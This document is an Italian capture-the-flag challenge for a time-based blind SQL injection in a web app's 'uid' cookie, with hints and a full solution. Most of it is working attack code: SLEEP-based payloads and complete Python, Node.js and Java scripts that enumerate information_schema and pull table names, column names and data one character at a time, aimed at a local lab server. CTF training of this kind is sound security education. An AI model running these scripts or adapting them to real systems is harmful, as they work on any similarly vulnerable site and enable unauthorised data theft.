# Challenge: Time-Based Blind SQL Injection

## Descrizione
Hai accesso al codice sorgente di un'applicazione web con una **SQL Injection nel cookie 'uid'** 🍪.
A differenza di altri tipi di injection, questa è particolarmente subdola perché:
- Non ci sono messaggi di errore dettagliati
- Non è possibile vedere direttamente i risultati delle query
- L'unico modo per estrarre informazioni è attraverso tecniche di **Blind SQL Injection**

L'obiettivo? Sfruttare queste vulnerabilità per recuperare la flag nascosta nella tabella!

## Obiettivo
- **Analizza il codice e identifica il punto vulnerabile (cookie 'uid')**
- **Implementa una Time-Based Blind SQL Injection**
- **Estrai carattere per carattere il valore della flag**
- **Recupera il contenuto della colonna `flag` dalla tabella `flag`**

## Avviare il server:
```bash
docker pull ghcr.io/ax3lt/sqli-ch3
docker run -p 80:80 ghcr.io/ax3lt/sqli-ch3
```

## Punti Vulnerabili
La query vulnerabile si trova nella route `/profile`:
```sql
SELECT username FROM users WHERE id = [valore-del-cookie]
```
- Il valore del cookie viene inserito direttamente nella query
- Non c'è sanitizzazione dell'input

## Suggerimenti
- **Time-Based Blind SQL Injection**:
  - Utilizza la funzione `SLEEP()` per rallentare la risposta del server
  - Inserisci la funzione `SLEEP()` all'interno di una condizione `IF()`
  - Se la condizione è vera, il server impiegherà più tempo a rispondere
  - Utilizza questa tecnica per estrarre informazioni carattere per carattere
- La tecnica base per una Time-Based injection è:
  ```sql
  SELECT * FROM users WHERE username = 'admin' AND IF(1=1, SLEEP(5), 0) = 0
  ```
  e per estrarre un carattere alla volta:
  ```sql
  1 AND IF(ASCII(SUBSTRING((SELECT colonna FROM tabella), 1, 1)) = X, SLEEP(5), 0) = 0
  ```

## Soluzione
Per risolvere il challenge, è necessario implementare uno script che estragga la flag carattere per carattere.

### Script Python:
```python
import requests
import time

endpoint = "http://localhost:8777/profile"

characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~"

def extract_flag(table_name, column_name):
    flag = ""
    cont = 1
    while True:
        for char in characters:
            payload = {
                'uid': f'2 OR IF((SELECT ASCII(SUBSTRING({column_name},{cont},1)) FROM {table_name} LIMIT 1)={ord(char)}, SLEEP(1), 0)=0',
            }
            timer = time.time()
            requests.get(endpoint, cookies=payload)
            timer = time.time() - timer
            if timer > 1:
                flag += char
                cont += 1
                print(f"Flag so far: {flag}")
                break
        else:
            break
    return flag


def extract_table_name():
    table_name = ""
    pos = 1
    while True:
        trovato = False
        for char in characters:
            payload = {
                'uid': f"2 OR (IF((SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1), {pos}, 1))) = {ord(char)}, SLEEP(1), 0) = 0) -- ",
            }

            start = time.time()
            requests.get(endpoint, cookies=payload)
            elapsed = time.time() - start
            if elapsed > 1:
                table_name += char
                print(f"Table name so far: {table_name}")
                pos += 1
                trovato = True
                break
        if not trovato:
            break
    return table_name

def extract_column_name(tbname, offset):
    column_name = ""
    pos = 1
    while True:
        trovato = False
        for char in characters:
            payload = {
                'uid': f"2 OR (IF((SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '{tbname}' LIMIT {offset},1), {pos}, 1))) = {ord(char)}, SLEEP(1), 0) = 0) -- ",
            }

            start = time.time()
            requests.get(endpoint, cookies=payload)
            elapsed = time.time() - start
            if elapsed > 1:
                column_name += char
                print(f"Column name so far: {column_name}")
                pos += 1
                trovato = True
                break
        if not trovato:
            break
    return column_name


table_name = extract_table_name()
column_name = extract_column_name(table_name, 1) # con 1 si riferisce alla prima colonna

flag = extract_flag(table_name, column_name)
print(f"Flag: {flag}")
```

### Script Node.js:
```javascript
const axios = require('axios');

const endpoint = 'http://localhost:8777/profile';
const characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[]^_`{|}~";

async function makeRequest(payload) {
    const start = Date.now();
    try {
        await axios.get(endpoint, {
            headers: {
                Cookie: `uid=${payload}`
            }
        });
    } catch (error) {
        // Ignoriamo gli errori, ci interessa solo il tempo di risposta
    }
    return (Date.now() - start) / 1000;
}

async function extractFlag(tableName, columnName) {
    let flag = "";
    let cont = 1;
    
    while (true) {
        let found = false;
        for (const char of characters) {
            const payload = `2 OR IF((SELECT ASCII(SUBSTRING(${columnName},${cont},1)) FROM ${tableName} LIMIT 1)=${char.charCodeAt(0)}, SLEEP(1), 0)=0`;
            const elapsed = await makeRequest(payload);
            
            if (elapsed > 1) {
                flag += char;
                cont++;
                console.log(`Flag so far: ${flag}`);
                found = true;
                break;
            }
        }
        if (!found) break;
    }
    return flag;
}

async function extractTableName() {
    let tableName = "";
    let pos = 1;
    
    while (true) {
        let found = false;
        for (const char of characters) {
            const payload = `2 OR (IF((SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1), ${pos}, 1))) = ${char.charCodeAt(0)}, SLEEP(1), 0) = 0) -- `;
            const elapsed = await makeRequest(payload);
            
            if (elapsed > 1) {
                tableName += char;
                console.log(`Table name so far: ${tableName}`);
                pos++;
                found = true;
                break;
            }
        }
        if (!found) break;
    }
    return tableName;
}

async function extractColumnName(tbname, offset) {
    let columnName = "";
    let pos = 1;
    
    while (true) {
        let found = false;
        for (const char of characters) {
            const payload = `2 OR (IF((SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '${tbname}' LIMIT ${offset},1), ${pos}, 1))) = ${char.charCodeAt(0)}, SLEEP(1), 0) = 0) -- `;
            const elapsed = await makeRequest(payload);
            
            if (elapsed > 1) {
                columnName += char;
                console.log(`Column name so far: ${columnName}`);
                pos++;
                found = true;
                break;
            }
        }
        if (!found) break;
    }
    return columnName;
}

async function main() {
    const tableName = await extractTableName();
    const columnName = await extractColumnName(tableName, 1);
    const flag = await extractFlag(tableName, columnName);
    console.log(`Flag: ${flag}`);
}

main().catch(console.error);
```

### Script Java:
```java
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class TimeBasedSQLInjection {
    private static final String ENDPOINT = "http://localhost:8777/profile";
    private static final String CHARACTERS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[]^_`{|}~";

    private static double makeRequest(String payload) throws Exception {
        URL url = new URL(ENDPOINT);
        long start = System.currentTimeMillis();
        
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("Cookie", "uid=" + URLEncoder.encode(payload, StandardCharsets.UTF_8));
        
        try {
            conn.getResponseCode();
        } catch (Exception e) {
            // Ignoriamo gli errori, ci interessa solo il tempo di risposta
        } finally {
            conn.disconnect();
        }
        
        return (System.currentTimeMillis() - start) / 1000.0;
    }

    private static String extractFlag(String tableName, String columnName) throws Exception {
        StringBuilder flag = new StringBuilder();
        int cont = 1;
        
        while (true) {
            boolean found = false;
            for (char c : CHARACTERS.toCharArray()) {
                String payload = String.format("2 OR IF((SELECT ASCII(SUBSTRING(%s,%d,1)) FROM %s LIMIT 1)=%d, SLEEP(1), 0)=0",
                        columnName, cont, tableName, (int) c);
                
                double elapsed = makeRequest(payload);
                if (elapsed > 1) {
                    flag.append(c);
                    cont++;
                    System.out.printf("Flag so far: %s%n", flag);
                    found = true;
                    break;
                }
            }
            if (!found) break;
        }
        return flag.toString();
    }

    private static String extractTableName() throws Exception {
        StringBuilder tableName = new StringBuilder();
        int pos = 1;
        
        while (true) {
            boolean found = false;
            for (char c : CHARACTERS.toCharArray()) {
                String payload = String.format("2 OR (IF((SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables " +
                        "WHERE table_schema = database() LIMIT 0,1), %d, 1))) = %d, SLEEP(1), 0) = 0) -- ", pos, (int) c);
                
                double elapsed = makeRequest(payload);
                if (elapsed > 1) {
                    tableName.append(c);
                    System.out.printf("Table name so far: %s%n", tableName);
                    pos++;
                    found = true;
                    break;
                }
            }
            if (!found) break;
        }
        return tableName.toString();
    }

    private static String extractColumnName(String tbname, int offset) throws Exception {
        StringBuilder columnName = new StringBuilder();
        int pos = 1;
        
        while (true) {
            boolean found = false;
            for (char c : CHARACTERS.toCharArray()) {
                String payload = String.format("2 OR (IF((SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns " +
                        "WHERE table_name = '%s' LIMIT %d,1), %d, 1))) = %d, SLEEP(1), 0) = 0) -- ", 
                        tbname, offset, pos, (int) c);
                
                double elapsed = makeRequest(payload);
                if (elapsed > 1) {
                    columnName.append(c);
                    System.out.printf("Column name so far: %s%n", columnName);
                    pos++;
                    found = true;
                    break;
                }
            }
            if (!found) break;
        }
        return columnName.toString();
    }

    public static void main(String[] args) {
        try {
            String tableName = extractTableName();
            String columnName = extractColumnName(tableName, 1);
            String flag = extractFlag(tableName, columnName);
            System.out.printf("Flag: %s%n", flag);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```